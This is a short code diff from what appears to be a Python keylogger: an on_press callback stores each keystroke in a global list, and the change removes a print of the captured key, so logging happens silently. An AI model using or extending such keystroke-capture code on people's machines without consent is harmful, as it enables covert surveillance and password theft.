@@ -20,7 +20,7 @@ keys =[]
 def on_press(key):
     global keys, count
 
-    print(key)
+ 
     keys.append(key)
     count += 1
 
